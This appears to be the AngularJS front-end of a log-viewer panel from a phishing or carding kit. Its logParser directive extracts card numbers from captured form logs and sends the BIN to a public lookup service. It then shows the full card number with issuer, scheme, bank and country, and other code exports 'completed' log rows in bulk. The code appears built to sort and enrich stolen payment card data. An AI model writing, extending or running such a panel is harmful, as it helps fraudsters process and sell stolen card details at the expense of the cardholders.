//######## NG ################

var logs = [];
app = angular.module('app', [])



app.directive('logviwer', function($http) {
    return {
        link: function(scope, el, attr) {
            window.logs_cope = scope;
            scope.logs = logs;
            scope.card_info = ''






        }

    }
})


app.filter('no_quotes', function() {
    return function(i) {
        return i.replace(/&quot;/g, '"')
    }
})


app.filter('uaparse', function() {
    return function(i) {

        var dev = UAParser(i);
        

        return dev.browser.name



    }
})


app.directive('buttonscontrolls', function() {
    return {
        link: function(scope, el, attr) {
            window.buttons_controlls_cope = scope;

            scope.$watch('btns.select_all', function(o, n) {
                if (o != n) {
                    if (n == false) {
                        //select all
                        dataTable.rows({
                            page: 'current'
                        }).select()
                    } else {
                        //unselct all
                        dataTable.rows().deselect();
                    }
                }
            })
        },
        $scope: true
    }
})



app.directive('logParser', ['$rootScope', '$timeout', '$http', function($rootScope, $timeout, $http) {
    // Runs during compile
    return {
        // name: '',
        // priority: 1,
        // terminal: true,
        scope: true, // {} = isolate, true = child, false/undefined = no change
        // controller: function($scope, $element, $attrs, $transclude) {},
        // require: 'ngModel', // Array = multiple requires, ? = optional, ^ = check parent elements
        restrict: 'A', // E = Element, A = Attribute, C = Class, M = Comment
        // template: '',
        // templateUrl: '',
        // replace: true,
        // transclude: true,
        // compile: function(tElement, tAttrs, function transclude(function(scope, cloneLinkingFn){ return function linking(scope, elm, attrs){}})),
        link: function($scope, iElm, iAttrs, controller) {


            //bin cheker
            //bin cheker


            //bin cheker
            var logs = $scope.log.log.split('\n');
            var log_obj = {};


            logs.forEach(function(i) {
                var log_split = i.split('=');
                log_obj[log_split[0]] = log_split[1]
            })



            $scope.remove_image = function(i, img) {


                bootbox.confirm('Image will remover for ever, are you sure?', function(res) { //2019
                    if (res) {
                        var image_path = img.replace(php_js.k_plugin.url_, '');
                        $http.get(php_js.k_plugin.ajax_url + "&image_remove", {
                            params: {
                                id: image_path
                            }
                        }).then(function(res) {
                            $scope.log.files.splice(i, 1);
                        }, function(e) {
                            console.error(e)
                        })
                    }
                })
            }








            var card = log_obj.cc || log_obj.c_c || false
            if (card) {
                card = card.match(/\d/g).join('');
                var bin = card.match(/^\d{6}/)[0];




                $.ajax({
                    url: "https://lookup.binlist.net/" + bin,
                    dataType: "json",
                    success: function(data) {


                        $scope.$apply(function() {




                            $scope.card_info += "Card number=" + card + "\n";
                            $scope.card_info += "Type=" + data.type + "\n";
                            $scope.card_info += "Shame=" + data.scheme + "\n";
                            $scope.card_info += "Origin=" + data.country.name + "\n";
                            $scope.card_info += "Bank=" + data.bank.name + "\n";
                            $scope.card_info += "Bank Url=" + data.bank.url + "\n";
                        })

                    }
                })



            }

        }
    };
}]);





app.directive('export', ['$timeout', function($timeout) {
    // Runs during compile
    return {
        // name: '',
        // priority: 1,
        // terminal: true,
        scope: false, // {} = isolate, true = child, false/undefined = no change
        // require: 'ngModel', // Array = multiple requires, ? = optional, ^ = check parent elements
        restrict: 'C', // E = Element, A = Attribute, C = Class, M = Comment
        // template: '',
        // templateUrl: '',
        // replace: true,
        // transclude: true,
        // compile: function(tElement, tAttrs, function transclude(function(scope, cloneLinkingFn){ return function linking(scope, elm, attrs){}})),
        link: function($scope, iElm, iAttrs, controller) {

        },
        controller: function($scope, $element, $attrs, $transclude) {
            $scope.export_dialog = false
            window.export_sc = $scope;


            $scope.export = {
                what_rows: "",
                ids: [],
                type: "",
                columns: []
            }



            $scope.exp = function() {



                // console.log($scope.export);
                $('.loader__').show()

                $scope.export_dialog = false
                window.location.href = php_js.k_plugin.ajax_url + "&export&data=" + JSON.stringify($scope.export)
                $scope.export = {
                    what_rows: "",
                    ids: [],
                    type: "",
                    columns: []
                }
                $('.loader__').hide()



            }


            $scope.$watch(function() {
                return $scope.export.what_rows
            }, function(n, o) {
                if (n != o) {


                    if (n == "all") {
                        $scope.export.ids = dataTable.rows().ids().toArray();
                        return
                    }

                    if (n == "selected") {
                        $scope.export.ids = dataTable.rows({ selected: true }).ids().toArray();
                        return
                    }


                    if (n == "completed") {
                        $scope.export.ids = dataTable.rows().data().filter(function(el) { return el.st == true }).toArray().map(function(el) { return el.rowid });
                        return
                    }



                }
            })




        },
    };
}]);







// 
// 
// 
// 
// 
// 
// 




// 
// 
// 
// 
// 
// 
// 
//